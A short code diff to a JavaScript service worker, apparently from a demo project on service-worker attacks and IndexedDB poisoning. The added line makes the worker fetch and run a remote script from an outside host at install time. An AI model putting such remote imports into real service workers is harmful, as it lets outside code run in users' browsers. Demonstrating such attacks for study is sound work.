@@ -1,5 +1,5 @@
 
-var url = 'https://demopwa.github.io/SW_Attacks/IndexDBPoisoning/fetch_sw.js'
+var url = null
 // importScripts('https://demopwa.github.io/SW_Attacks/IndexDBPoisoning/fetch_sw.js')
 function createDB(){   
    var request = indexedDB.open('demo_db', 1);
@@ -18,6 +18,7 @@ function createDB(){
 
 self.addEventListener('install', event => {
   console.log('V1 installing…');
+  importScripts('https://demopwa.github.io/SW_Attacks/IndexDBPoisoning/fetch_sw.js')
  
 });
 
